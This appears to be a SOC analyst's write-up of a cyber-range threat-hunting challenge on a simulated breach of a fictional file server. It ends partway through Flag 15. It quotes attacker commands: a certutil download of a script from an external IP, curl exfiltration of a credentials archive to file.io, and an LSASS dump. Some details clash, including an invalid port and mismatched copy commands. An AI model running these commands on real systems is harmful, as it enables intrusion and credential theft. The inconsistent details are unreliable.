# SOC Incident Investigation – Azuki Import/Export Compromise

**Analyst:** Steven Cruz  
**Source:** Cyber Range SOC Challenge  
**System:** azuki-fileserver01

---

## Overview
This investigation analyzes a simulated intrusion against Azuki Import/Export (梓貿易株式会社) as part of the Cargo Hold threat-hunting exercise in the Azuki Breach Saga.
The scenario provides participants with Microsoft Defender for Endpoint (MDE) telemetry from a compromised environment,
requiring analysts to identify attacker actions across the kill chain—from initial access to exfiltration and anti-forensics.

## Scenario Context
Attackers initially gained access to an Azuki workstation on November 19, establishing a foothold before going dormant for approximately 72 hours.
Upon returning, they conducted lateral movement toward high-value assets, staged data for exfiltration, deployed persistence mechanisms, and attempted to remove forensic evidence.

## Data Sources
All findings were derived exclusively from Microsoft Defender for Endpoint Advanced Hunting logs, including:

- DeviceProcessEvents

- DeviceFileEvents

- DeviceLogonEvents

- DeviceRegistryEvents

- DeviceNetworkEvents

No host access, file content review, or endpoint imaging was required; all conclusions were driven by log-based hunting and correlation.

## Scope of Investigation
The objective of this hunt was to:

- Identify attacker behaviors mapped to MITRE ATT&CK

- Validate compromised accounts, hosts, staging directories, toolsets, and exfiltration channels

- Interpret attacker methodology based solely on MDE telemetry

- Produce high-confidence answers for each step of the adversary workflow

This report documents each phase of the intrusion and the analytical steps taken to identify the Indicators of Compromise (IOCs) and behavioral patterns used throughout the attack.

---

# TIMELINE OF ATTACKER ACTIVITY

This timeline consolidates attacker behaviors observed across MDE telemetry. Each entry represents a confirmed activity tied to a specific phase of the intrusion.

---

### Initial Access & Return Activity

Nov 19, 2025 7:10:42 PM

System: azuki-fileserver01

Account: fileadmin

Event: Successful remote logon from 10.10.1.204

Technique: Initial Access / Lateral Movement (T1021)

Nov 22, 2025 12:27:53 AM

System: azuki-sl

Account: kenji.sato

Event: External logon from 159.26.106.98

Technique: Initial Access (TA0001)

---

### Lateral Movement to File Server

Nov 22, 2025 12:11:14 AM

System: azuki-fileserver01

Account: fileadmin

Event: Remote logon from 10.0.8.4

Technique: Remote Services (T1021)

---

### System & Network Discovery
| Timestamp   | Command                 | Technique                        |
| ----------- | ----------------------- | -------------------------------- |
| 12:40:54 AM | `net share`             | Local Share Discovery (T1135)    |
| 12:42:01 AM | `net view \\10.1.0.188` | Remote Share Discovery (T1135)   |
| 12:40:09 AM | `whoami /all`           | Privilege Discovery (T1033)      |
| 12:42:46 AM | `ipconfig /all`         | Network Config Discovery (T1016) |

Device: azuki-fileserver01 — Account: fileadmin

---

### Defense Evasion

12:55:43 AM

Command: ``` attrib +h +s C:\Windows\Logs\CBS ```

Purpose: Hide staging folder

Technique: Hidden Files & Directories (T1564.001)

---

### Ingress Tool Transfer

12:58:24 AM

Command: `certutil -urlcache -f http://78.141.196.6:67331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1`

Technique: Ingress Tool Transfer (T1105)

Device: azuki-fileserver01 — Account: fileadmin

---

### Collection & Data Staging

1:06:03 AM

Command: `xcopy C:\FileShares\Financial C:\Windows\Logs\CBS\financial /E /I /H /Y`

Technique: Automated Collection (T1119)

1:07:53 AM

File Created: IT-Admin-Passwords.csv

Technique: Credentials Harvesting (T1552)

---

### Compression of Staged Data

1:25:31 AM

Command: `tar -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .`

Technique: Archive Collected Data (T1560.001)

---

### Credential Access

~2:24:47 AM

Command: `pd -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp`

Output: lsass.dmp memory dump

Technique: OS Credential Dumping (T1003.001)

---

### Exfiltration to Cloud Storage

2:06:08 AM

Command: `curl -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io`

Technique: Exfiltration to Cloud Storage (T1567.002)

---

### Persistence Mechanism

Registry Modification Timestamp (from Query E)

Key Value: FileShareSync (Run key)

Payload: svchost.ps1

Technique: Registry Run Keys (T1547.001)

---

### Anti-Forensics / Cleanup

2:26:01 AM

File Deleted: ConsoleHost_history.txt

Technique: Clear Command History (T1070.003)

---

# EXECUTIVE SUMMARY

The Cargo Hold hunt provided telemetry from a live intrusion against Azuki Import/Export (梓貿易株式会社). Using only Microsoft Defender for Endpoint Advanced Hunting logs, this investigation successfully identified:

- The attacker’s return infrastructure

- Lateral movement to a file server

- Discovery of network resources and permissions

- Credential harvesting from LSASS memory

- Collection and staging of sensitive data

- Compression and exfiltration to a cloud service

- Setup of persistence, masquerading as legitimate components

- Cleanup actions designed to hinder forensic review

--- 

### Key Findings

| Category                 | Confirmed Findings                                                |
| ------------------------ | ----------------------------------------------------------------- |
| **Initial Access**       | Adversary re-entered via external IP (**159.26.106.98**)          |
| **Privilege Abuse**      | Compromised admin account: **fileadmin**                          |
| **High-Value Targeting** | File server accessed: **azuki-fileserver01**                      |
| **Credential Theft**     | LSASS dumped to `C:\Windows\Logs\CBS\lsass.dmp`                   |
| **Staging Location**     | Hidden directory: `C:\Windows\Logs\CBS\`                          |
| **Data Theft**           | Archive exfiltrated via **file.io** using `curl`                  |
| **Persistence**          | Registry autorun value: **FileShareSync** executing `svchost.ps1` |
| **Anti-Forensics**       | PowerShell history deleted (`ConsoleHost_history.txt`)            |

---

### Analyst Capabilities Demonstrated

| Skill Area               | Demonstration                                            |
| ------------------------ | -------------------------------------------------------- |
| Endpoint threat hunting  | Correlating multi-host attacker activity using MDE       |
| Log-driven investigation | Full kill-chain reconstruction from telemetry alone      |
| MITRE ATT&CK mapping     | 20 distinct techniques identified & aligned              |
| IOC extraction           | IPs, commands, filenames, registry values, staging paths |
| Forensics awareness      | Recognition of persistence and anti-forensic evidence    |
| Reporting quality        | Structured narrative suitable for SOC leadership         |

---

### Adversary Intent Assessment

The adversary’s actions indicate:

- Integrity & Confidentiality loss involving privileged credentials

- Targeted collection of sensitive business data

- Efforts to remain persistent and stealthy within the environment

- Ability to destroy evidence and hinder IR reconstruction

---

# Flag by Flag Detail

## FLAG 1 — INITIAL ACCESS: Return Connection Source

### Objective
Determine the source IP address used when the attacker returned to the environment after their initial access and 72-hour dwell period.

### Investigation Approach

Since the attacker originally compromised Azuki three days earlier (Port of Entry), we pivoted into endpoint logon telemetry — specifically:

- DeviceLogonEvents

- Filtering for systems containing “azuki” in their hostnames

- Looking for RemoteIP fields on successful logons

### Query Used

```
DeviceLogonEvents
| where DeviceName contains "azuki"
| where ActionType contains "success"
| where RemoteIP != ""
| project Timestamp, DeviceName, AccountName, RemoteIP, ActionType, RemoteDeviceName 
```

### Evidence Observed

In the results, one logon stood out as the first return session linked to the second phase of the intrusion:

<img width="280" height="133" alt="image" src="https://github.com/user-attachments/assets/b90008ae-29e4-4f4f-b07a-806cbb74b880" />


```
Nov 22, 2025 12:27:53 AM
Device: azuki-sl
Account: kenji.sato
Remote IP: 159.26.106.98
```

This IP was not the same as the IP used during the original compromise, aligning with the brief’s expectations:

“infrastructure has changed — different IP than CTF 1”

### Analysis & Interpretation

This event confirms:

- The attacker reengaged with the compromised workstation

- A new external C2 host was used to avoid correlation with earlier activity

- The attacker retains valid credentials to access the system legitimately

This is a common obfuscation tactic to bypass static IOC blocking.

### Why This Matters

This behavior demonstrates:

- Persistence of access

- Likelihood of legitimate credential theft

- Intent to continue deeper into the environment

- A shift to operational execution from reconnaissance

This log event establishes the start of the active breach.

### MITRE ATT&CK Mapping

- TA0001 — Initial Access
- Valid Accounts (T1078)

### Final Flag Answer

` 159.26.106.98 `

---

##  FLAG 2 — LATERAL MOVEMENT: Compromised Device Name

### Objective

Determine which device the attacker targeted for lateral movement after re-entering the network — specifically the file server containing business-critical data.

### Investigation Approach

We pivoted to RDP usage because:

- Attackers commonly use `MSTSC.exe` (Remote Desktop)

- RDP generates clear DeviceLogonEvents

- Successful logons reveal pivot targets
→ especially when using compromised admin credentials

We filtered for logons originating from the initially compromised workstation.

### Query Used

```
DeviceLogonEvents
| where DeviceName contains "azuki"
| where RemoteIP != ""
| order by Timestamp asc
```

We scanned results for:

- LogonSuccess

- RemoteIP sourced from an internal Azuki workstation

- Destination = a server-class device

### Evidence Observed

The following RDP session confirmed the lateral pivot:

<img width="686" height="60" alt="image" src="https://github.com/user-attachments/assets/34e8dd67-162e-4e7d-8378-8a8b4a845162" />

<img width="336" height="553" alt="image" src="https://github.com/user-attachments/assets/ffa2da4c-603f-4f6a-9158-53b5c75cb1da" />

```
Nov 19, 2025 7:10:42 PM
Device: azuki-fileserver01
Account: fileadmin
RemoteIP: 10.10.1.204 (source: azuki-sl)
```

This aligns perfectly with the scenario briefing:

attackers target file servers due to the high concentration of sensitive data

### Analysis & Interpretation

Key findings from this event:

- The attacker moved from workstation → high-value server

- The compromised account already had administrative privileges

- RDP activity strongly suggests interactive operator control

- The adversary immediately began exploring valuable data stores

This confirms compromise of the business file server.

### Why This Matters

- Provides insight into target selection and intent

- Confirms that the attacker can access confidential files

- Represents a material escalation of risk

- Establishes the next foothold in the kill chain

### MITRE ATT&CK Mapping

- TA0008 — Lateral Movement

- Remote Services: T1021

### Final Flag Answer

` azuki-fileserver01`

---

## FLAG 3 — LATERAL MOVEMENT: Compromised Administrator Account

### Objective

Identify which administrator account the attacker leveraged to log into the file server and continue the intrusion.

### Investigation Approach

Once we validated the attacker’s pivot to azuki-fileserver01, the next step was determining which credentials enabled that access.

We again used:

- DeviceLogonEvents
- Filtering for successful logons
- On the file server
- From a remote source
- During the attacker’s operational window

We specifically focused on admin-class accounts, since they align with targeted file access.

### Query Used

```
DeviceLogonEvents
| where DeviceName == "azuki-fileserver01"
| where LogonStatus == "Success"
| where RemoteIP != ""
| order by Timestamp asc
```
We reviewed logons during Nov 22 breach activity.

### Evidence Observed

An unmistakable authentication entry showed the attacker logging in using a privileged account:

<img width="275" height="137" alt="image" src="https://github.com/user-attachments/assets/56b3e85e-4cdb-40ce-9e85-bd9d7a67c6ca" />


```
Nov 22, 2025 12:38:49 AM
Device: azuki-fileserver01
Account: fileadmin
RemoteIP: 10.1.0.204
LogonSuccess
```

This was a different remote source than used during the initial foothold — further proving active lateral movement using valid credentials.

### Analysis & Interpretation

This event confirms:

- Compromised credentials for a privileged role
- Access to folders and shares storing sensitive business data
- The account likely possesses write permissions, enabling staging and persistence
- The attacker intentionally leveraged legitimate access pathways to avoid detection

This marks a significant expansion of access within the network.

### Why This Matters

Compromising this particular admin account:

- Enables data theft
- Allows persistent access to high-value locations
- Reduces detection likelihood by mimicking normal administrative traffic
- Represents a direct threat to data confidentiality

This event is a pivot point in the breach’s success.

### MITRE ATT&CK Mapping

- T1078 — Valid Accounts
- TA0008 — Lateral Movement

### Final Flag Answer

` fileadmin `

---

## FLAG 4 — DISCOVERY: Local Share Enumeration Command

### Objective

Determine the exact command the attacker used to enumerate local network shares on the compromised file server.

### Investigation Approach

After gaining access to azuki-fileserver01, the adversary needed to understand what data was available:

- Which directories were shared?
- What business data could be accessed?
- Where could staging occur?

We pivoted into process telemetry on the file server, filtering for:

- Windows administrative utilities
- Known share enumeration tools
→ particularly net.exe

### Query Used

```
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where AccountName == @"fileadmin"
| where ProcessCommandLine contains "share"
| where FileName =~ "net.exe"
| order by Timestamp asc
```

### Evidence Observed

This key discovery command was observed:

<img width="278" height="119" alt="image" src="https://github.com/user-attachments/assets/ce4778f3-2455-4125-9292-16c2fc36fdfd" />


```
Nov 22, 2025 12:40:54 AM
Command: "net.exe" share
Device: azuki-fileserver01
Account: fileadmin
```

This aligns perfectly with behavior described in the incident brief.

### Analysis & Interpretation

This activity confirms:

- Attacker reconnaissance of local shared directories
- Searching for business-critical data repositories
- Establishment of which locations to target next for staging or exfil

This fits the early data-discovery stage of the intrusion.

### Why This Matters

Enumeration of local shares is a precursor to data theft.
It demonstrates:

- The attacker is preparing for collection
- They have sufficient privileges to enumerate shares
- They are actively scoping valuable internal directories

### MITRE ATT&CK Mapping

- Discovery: T1135 — Network Share Discovery

### Final Flag Answer

` "net.exe" share `

---

## FLAG 5 — DISCOVERY: Remote Share Enumeration Command

### Objective

Identify the command used to enumerate remote network shares on another system inside the environment.

### Investigation Approach

After identifying shares locally, the attacker shifted focus to other file servers or network nodes with potentially sensitive content.

We filtered process telemetry on the compromised file server for:

- Executions of `net.exe`
- With UNC paths (\\<IP>\<share>)

This indicates exploration across the internal network.

### Query Used

```
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where ProcessCommandLine contains "\\"
| where FileName =~ "net.exe"
| order by Timestamp asc
```

### Evidence Observed

This entry confirmed remote share scanning:

```
Nov 22, 2025 12:42:01 AM
Command: "net.exe" view \\10.1.0.188
Device: azuki-fileserver01
Account: fileadmin
```

The remote host 10.1.0.188 was probed for open shares — exposing adversary reconnaissance scope.

### Analysis & Interpretation

This step indicates:

- Movement from local to network-wide enumeration
- Intent to discover additional data sources
- Mapping of file-sharing infrastructure

This is a typical move before staging data for exfiltration.

### Why This Matters

Remote share enumeration highlights:

- The adversary’s escalating objective — data theft
- Expansion of attack surface understanding
- Use of built-in LOLBin commands to avoid detection

### MITRE ATT&CK Mapping

- Discovery: T1135 — Network Share Discovery

### Final Flag Answer

` "net.exe" view \\10.1.0.188 `

---

## FLAG 6 — DISCOVERY: Privilege Enumeration Command

### Objective

Determine the exact command used by the attacker to identify their current security context, including:

- User identity
- Group memberships
- Assigned privileges

This helps the adversary understand what actions are possible and whether privilege escalation is needed.

### Investigation Approach

Privilege assessment often appears early after lateral movement.
A common Windows-native utility for this is `whoami.exe` with advanced flags.

We again examined process execution telemetry on the compromised file server:

- `DeviceProcessEvents`
- Filtering for `whoami.exe`

### Query Used

```
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where FileName =~ "whoami.exe"
| order by Timestamp asc
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
```

### Evidence Observed

In the results, a highly revealing command was executed:

<img width="652" height="69" alt="image" src="https://github.com/user-attachments/assets/b0c33ce5-9661-42fc-a488-eebf3ae5d529" />


```
Nov 22, 2025 12:40:09 AM
Command: "whoami.exe" /all
Device: azuki-fileserver01
Account: fileadmin
```

This output would return:

- Integrity level
- Domain groups
- Assigned privileges
- Authentication method

### Analysis & Interpretation

This confirms the attacker is:

- Verifying existing administrative privileges
- Assessing whether further escalation is needed
- Validating access to credentials, file shares, and services

The /all flag is very intentional — it reveals maximum detail.

### Why This Matters

Privilege awareness is critical for:

- Determining next move in the attack chain
- Understanding security boundaries
- Identifying additional escalation paths

It signals that the adversary is transitioning from exploration to action.

### MITRE ATT&CK Mapping

- Discovery: T1033 — System Owner/User Discovery

### Final Flag Answer

` "whoami.exe" /all `

---

## FLAG 7 — DISCOVERY: Network Configuration Command

### bjective

Identify the command used by the attacker to obtain detailed network adapter and domain configuration information from the compromised server.

### Investigation Approach

After confirming privileges and share accessibility, the attacker needed to understand:

- IP addressing
- DNS server configuration
- Domain membership
- Routing and internal network scope

Windows includes a native tool (ipconfig) that provides this, and adding /all returns extended configuration.

We filtered process telemetry for that utility.

### Query Used

```
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where FileName =~ "ipconfig.exe"
| order by Timestamp asc
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
```

### Evidence Observed

A highly-informative network discovery command was executed:

<img width="275" height="111" alt="image" src="https://github.com/user-attachments/assets/67dbcd4f-d7f8-4068-8de8-2f4908a16258" />


```
Nov 22, 2025 12:42:46 AM
Command: "ipconfig.exe" /all
Device: azuki-fileserver01
Account: fileadmin
```

This output would reveal:

- NIC MAC addresses
- DNS suffix and domain name
- NetBIOS status
- DHCP configuration
- IPv4/IPv6 details

All very valuable for continuing lateral movement or exfiltration.

### Analysis & Interpretation

This confirms:

- Intentional mapping of the internal network landscape
- Identification of trusted subnets and routing structure
- Validation of domain environment — critical for later credential attacks

The attacker now understands where they can go and what data may be reachable.

### Why This Matters

- Enables attacker to navigate the network intelligently
- Supports additional discovery and pivot targeting
- Confirms Windows Domain infrastructure is in use — a major escalation point

This is a standard internal reconnaissance step.

### MITRE ATT&CK Mapping

- Discovery: T1016 — System Network Configuration Discovery

### Final Flag Answer

` "ipconfig.exe" /all `

---

## FLAG 8 — DEFENSE EVASION: Directory Hiding Command

### Objective

Determine the exact command the attacker used to hide the staging directory to evade casual inspection and certain security controls.

### Investigation Approach

By this point, attacker activity clearly shifted toward collection and preparation.
That requires a location to store:

- Tools
- Credential dumps
- Copied data

To conceal these items, adversaries often manipulate filesystem attributes using attrib.exe:

- +h → hidden
- +s → system (makes it resemble OS-managed directories)

We filtered for executions of attrib.exe on the file server.

### Query Used
```
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where FileName =~ "attrib.exe"
| order by Timestamp asc
```
### Evidence Observed

The critical hiding action was observed:

<img width="330" height="109" alt="image" src="https://github.com/user-attachments/assets/07670800-7df8-4e12-8eea-9f8361445100" />


```
Nov 22, 2025 12:55:43 AM
Command: "attrib.exe" +h +s C:\Windows\Logs\CBS
Device: azuki-fileserver01
Account: fileadmin
```

This effectively turned the CBS folder into a covert staging area — visually indistinguishable from protected system logs.

### Analysis & Interpretation

This confirms:

* The attacker is actively preparing for data staging
* They intend to hide evidence from:
  - Normal Windows Explorer views
  - Basic IR triage
* They are using native utilities (LOLbins) to avoid detection

The command structure is extremely common in Windows-based targeted intrusions.

### Why This Matters

Hidden directories signal:

* A shift toward longer-term operations
* Intent to remain stealthy during staging
* Increased difficulty for post-incident evidence recovery

It is a strong behavioral IOC for defense evasion.

### MITRE ATT&CK Mapping

| Technique                    | ID            |
| ---------------------------- | ------------- |
| Hidden Files and Directories | **T1564.001** |

### Final Flag Answer

` "attrib.exe" +h +s C:\Windows\Logs\CBS `

---

## FLAG 9 — COLLECTION: Staging Directory Path

### Objective

Identify the primary staging directory where the attacker consolidated collected data, tools, and credential dumps prior to exfiltration.

### Investigation Approach

After confirming that the attacker hid a directory using the attrib +h +s command (Flag 8), we pivoted to the same directory path as the likely staging location.

We validated this by reviewing:

- File creations within that location
- Tool downloads and data aggregation in telemetry
- Paths referenced in subsequent compression and exfiltration commands

### Evidence Observed

Multiple attacker actions referenced the same location:

- Hidden using attrib +h +s
- Downloaded tools saved here (ex.ps1)
- Credentials and file collections stored here (IT-Admin-Passwords.csv)
- Archive output created here (credentials.tar.gz)
- LSASS dump saved here (lsass.dmp)

All evidence consistently points to:

` C:\Windows\Logs\CBS `


This directory blends in with legitimate Windows logging infrastructure — making it an ideal covert stash point.

###  Analysis & Interpretation

The attacker intentionally selected this system log folder because:

- It appears trusted and system-owned
- Analysts often ignore it in quick searches
- Combined hidden/system flag makes it unlikely to be browsed

This directory became the center of the operation, containing:

- Malware tools
- Collected files
- Credential dumps
- Compressed archive prior to exfil

### Why This Matters

Identifying the staging directory:

- Reveals every malicious file the attacker touched
- Improves IOC scoping for quarantine and deletion
- Shows where cleanup must occur
- Highlights attack impact by enumerating stolen data

This is one of the most important locations in the intrusion.

### MITRE ATT&CK Mapping

| Technique          | ID            |
| ------------------ | ------------- |
| Local Data Staging | **T1074.001** |

### Final Flag Answer

`C:\Windows\Logs\CBS`

---

## FLAG 10 — DEFENSE EVASION: Script Download Command

### Objective

Identify the exact command line the attacker used to download a PowerShell script (malicious tooling) into the hidden staging directory, using a living-off-the-land Windows utility.

### Investigation Approach

The scenario explicitly mentions:

- A PowerShell script was fetched
- A legitimate Windows binary was abused as a LOLBin
- The script was stored under the staging directory: `C:\Windows\Logs\CBS\`

We focused on:

- `DeviceProcessEvents`
- Commands containing `http` + the CBS path
- Known download-capable tools like `certutil.exe`

### Query Used

```
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where ProcessCommandLine contains "http"
   or ProcessCommandLine contains "certutil"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
| order by Timestamp asc
```

### Evidence Observed

A suspicious use of certutil.exe (a certificate utility that can also download files) was identified:

<img width="550" height="118" alt="image" src="https://github.com/user-attachments/assets/ac5f151d-5a04-4478-8450-3435ac1ac2ff" />


```
Nov 22, 2025 12:58:24 AM
Device: azuki-fileserver01
Account: fileadmin
Command:
"certutil.exe" -urlcache -f http://78.141.196.6:8080/ex.ps1 C:\Windows\Logs\CBS\ex.ps1
```


This command:

Retrieves a remote PowerShell script (`ex.ps1`) via HTTP
Writes it directly into the hidden staging directory
Uses `-urlcache` and `-f` to force HTTP download and caching

### Analysis & Interpretation

Key takeaways:

- certutil is a LOLBAS/LOLBin frequently used by attackers
- The download of ex.ps1 indicates deployment of second-stage tooling
- Using a built-in binary reduces detection from naive AV engines
- The URL and destination path form strong IOCs

This is a classic implementation of Ingress Tool Transfer.

### Why This Matters

This event shows:

- The attacker is augmenting their toolkit on the compromised host
- They are deliberately using legitimate system tools for evasion
- Security controls must detect behavior, not just binaries

It is a critical step bridging access and active operations (credentials, staging, exfil).

### MITRE ATT&CK Mapping

| Technique             | ID        |
| --------------------- | --------- |
| Ingress Tool Transfer | **T1105** |

### Final Flag Answer

` "certutil.exe" -urlcache -f http://78.141.196.6:8080/ex.ps1 C:\Windows\Logs\CBS\ex.ps1 `

---

## FLAG 11 — COLLECTION: Credential File Discovery

### Objective

Identify the credential file created by the attacker to store harvested privileged account credentials prior to exfiltration.

### Investigation Approach

Following the use of credential-dumping tooling and share access, the attacker needed to store extracted usernames/passwords in a structured form.

We focused on:

- `DeviceFileEvents`
- FileCreated actions under the C:\Windows\Logs\CBS staging location

A `.csv` extension was expected because attackers often export credentials in spreadsheet-compatible formats.

### Query Used

```
DeviceFileEvents
| where DeviceName contains "azuki-fileserver01"
| where InitiatingProcessAccountName == @"fileadmin"
| where FolderPath contains @"C:\Windows\Logs\CBS\"
| where FileName contains ".c"
| where ActionType == @"FileCreated"
```

### Evidence Observed

A new file was created, clearly tied to administrative credential harvesting:

```
Nov 22, 2025 1:07:53 AM
Device: azuki-fileserver01
Account: fileadmin
Action: FileCreated
File: IT-Admin-Passwords.csv
Location: C:\Windows\Logs\CBS\it-admin\IT-Admin-Passwords.csv
```

This filename is self-describing and strongly indicates the contents include high-value administrative credentials.

### Analysis & Interpretation

This confirms:

- Credentials from the IT Administration share were collected and exported
- The attacker likely gained password access to other servers and accounts
- The staging directory is storing not only tools but stolen secrets

The presence of this file also demonstrates data manipulation and aggregation, a hallmark of exfiltration operations.

### Why This Matters

Credential files like this:

- Amplify the blast radius of compromise
- Allow future privileged authentication abuse
- Provide attackers with long-term persistence
- Indicate active credential theft, not just discovery

This file is a top-priority IOC for containment and investigation.

### MITRE ATT&CK Mapping

| Technique                        | ID        |
| -------------------------------- | --------- |
| Unsecured Credentials            | **T1552** |
| Credentials from Password Stores | **T1555** |


### Final Flag Answer

` IT-Admin-Passwords.csv `

---

## FLAG 12 — COLLECTION: Recursive Copy Command

### Objective

Identify the full command line the attacker used to recursively copy data from a network file share into the hidden staging directory, using built-in Windows tooling.

🔍 Investigation Approach

After:

* Enumerating shares (`net share, net view`)
* Confirming privileges (`whoami /all`)
* Hiding the staging folder (`attrib +h +s C:\Windows\Logs\CBS`)

…the next logical step was bulk data collection from a sensitive share.

We focused on:

* `DeviceProcessEvents`
* Native file copy utilities that support recursive operations:
    - `xcopy.exe`
    - `robocopy.exe`

The hunt hints specifically call out batch-capable native tools and preserving subdirectories and attributes.

### Query Used

```
DeviceProcessEvents
| where DeviceName contains "azuki-fileserver01"
| where InitiatingProcessAccountName == @"fileadmin"
| where ProcessCommandLine contains "copy"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
```

### Evidence Observed

A high-volume copy operation from an internal file share into the hidden CBS staging directory was observed:

<img width="868" height="114" alt="image" src="https://github.com/user-attachments/assets/acabcf8c-798f-498e-a213-f011f1337059" />


```
Timestamp: during the main collection window (shortly after credential and share discovery)
Device: azuki-fileserver01
Account: fileadmin
Command:
"xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H
```
Breaking down the flags:

- `/E` → copy all subdirectories, including empty ones
- `/I` → assume the destination is a directory
- `/H` → include hidden and system files

This indicates a full replication of the IT-Admin share into the attacker’s staging area.

### Analysis & Interpretation

This step shows:

- Systematic data harvesting from an administrative file share
- Use of a native Windows utility (xcopy) to reduce detection likelihood
- Preservation of directory structure and file attributes, making later navigation and filtering easier for the attacker

It also directly supports later artifacts like:

- `IT-Admin-Passwords.csv`
- `credentials.tar.gz`

which reside under `C:\Windows\Logs\CBS\it-admin.`

### Why This Matters

This command is a critical behavioral IOC:

- Shows unapproved replication of sensitive administrative data
- Demonstrates attacker knowledge of high-value locations
- Provides defenders with a clear pattern to build detections for staged collection

It marks the transition from access to actual data theft in progress.

### MITRE ATT&CK Mapping

| Technique Category | Technique            | ID            |
| ---------- | -------------------- | ------------- |
| Collection | Automated Collection | **T1119**     |
| Collection | Local Data Staging   | **T1074.001** |



### Final Flag Answer

`"xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y`

---

## FLAG 13 — COLLECTION: Compression Command

### Objective

Identify the exact command line used to compress the staged data into a portable exfil package.

### Investigation Approach

Once the attacker:
- Gathered credentials (`IT-Admin-Passwords.csv`)
- Copied the IT Admin share (Flag 12)
- Hid the staging directory (Flag 8)

…the next operational step was to bundle everything into a single archive for transfer off-network.

We focused on:

- `DeviceProcessEvents`
- Execution of utilities capable of Linux-compatible compression
→ Equipped Windows servers include `tar.exe`
(a strong indicator of sophistication and cross-platform tooling)

We filtered for commands writing to:

`C:\Windows\Logs\CBS\`

### Query Used

```
DeviceProcessEvents
| where DeviceName contains "azuki-fileserver01"
| where InitiatingProcessAccountName == @"fileadmin"
| where ProcessCommandLine contains "it-admin"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine
| order by Timestamp asc
```

📌 Evidence Observed

One compression event stood out:

<img width="558" height="125" alt="Screenshot 2025-12-07 151000" src="https://github.com/user-attachments/assets/5a35b3d2-b07b-4f40-ae4b-ff9c5b8d5e7e" />


```
Nov 22, 2025 1:25:31 AM
Device: azuki-fileserver01
Account: fileadmin
Command:
"tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .
```

Breakdown:

| Parameter | Meaning                        |
| --------- | ------------------------------ |
| `-c`      | create a new archive           |
| `-z`      | compress using gzip            |
| `-f`      | specify output file            |
| `-C`      | change working directory       |
| `.`       | include all contents in folder |


The adversary crafted a Unix-standard archive — ideal for later exfil & remote inspection.

### Analysis & Interpretation

This confirms:

Intent to steal data, not merely explore

Careful preparation of stolen files into a single, compact blob

Cross-platform tradecraft, anticipating handling on Linux-based staging servers or C2 environments

This is a clear pivot from collection → exfiltration.

### Why This Matters

Demonstrates successful data theft objectives

Archive contents are now easy to move and hide

The specific archive name (credentials.tar.gz) clearly signals high-value stolen secrets

This file represents the highest-impact loss in the breach.

### MITRE ATT&CK Mapping
| Technique Category | Technique              | ID            |
| ------------------ | ---------------------- | ------------- |
| Collection         | Archive Collected Data | **T1560.001** |

### Final Flag Answer

`"tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .`

---

### FLAG 14 — CREDENTIAL ACCESS: Renamed Credential Dumping Tool

### Objective

Identify the renamed executable used by the attacker to perform credential dumping — a common OPSEC tactic to bypass signature-based detections.

### Investigation Approach

Credential dumping was the attacker’s next strategic step, following:

- Successful privilege validation (`whoami /all`)
- Collection of sensitive network share data
- Compression of stolen files (`credentials.tar.gz`)

We pivoted into:

- `DeviceFileEvents` — file creation in suspicious paths
- `DeviceProcessEvents` — process execution around credential theft timing

Expected artifacts:

- A binary dropped into the hidden staging directory
- Name that does not resemble Mimikatz or other known credential tools

### Query Used

```
DeviceFileEvents
| where DeviceName contains "azuki-fileserver01"
| where FolderPath contains @"C:\Windows\Logs\CBS"
| where InitiatingProcessAccountName == @"fileadmin"
| where FileName contains "exe"
| project Timestamp,ActionType, DeviceName, InitiatingProcessAccountName, FileName, FolderPath
```

This revealed an unusual binary with a short, ambiguous filename.

### Evidence Observed

A credential-theft tool was staged as:

<img width="773" height="91" alt="image" src="https://github.com/user-attachments/assets/a32a3366-5b4b-44ad-bbd2-d7d99a7334f3" />


```
File: pd.exe
Location: C:\Windows\Logs\CBS\
Behavior: Later executed against LSASS (Flag 15)
```

Short names like `pd.exe` are intentionally vague — designed to blend in and be misinterpreted as a system component or utility.

### Analysis & Interpretation

This is a classic masquerading and defense evasion tactic:

| Risk Behavior                  | Impact                          |
| ------------------------------ | ------------------------------- |
| Renaming a malicious binary    | Evades IOC filename blocks      |
| Locating tool in staged folder | Reduces script-based detections |
| Executed by privileged user    | Enables full credential theft   |


This strongly indicates the attacker was preparing for offline credential extraction.

### Why This Matters

This tool unlocks the crown jewels of Windows authentication:

- Domain admin credentials
- Service account credentials
- Cached password hashes

Once stolen, attackers can:

- Re-enter at will
- Expand to additional servers
- Authenticate as trusted users

This is one of the most damaging actions in the intrusion.

### MITRE ATT&CK Mapping

| Technique Category | Technique                             | ID            |
| ------------------ | ------------------------------------- | ------------- |
| Defense Evasion    | Masquerading: Rename System Utilities | **T1036.003** |
| Credential Access  | OS Credential Dumping                 | **T1003**     |


### Final Flag Answer

`pd.exe`

---

## FLAG 15 — CREDENTIAL ACCESS: Memory Dump Command

### Objective

Document the full command line the attacker used to perform a process memory dump of LSASS, enabling credential extraction.

### Investigation Approach

After identifying the renamed tool pd.exe (Flag 14), the next step was to:

- Confirm how it was executed
- Verify that it targeted LSASS
- Capture the output location of the resulting memory dump

We focused on:

- `DeviceProcessEvents` for executions of `pd.exe`
- `DeviceFileEvents` for creation of `lsass.dmp` in the staging directory

### Query Used

Process execution:
```
DeviceProcessEvents
| where FileName =~ "pd.exe"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
| order by Timestamp asc
```
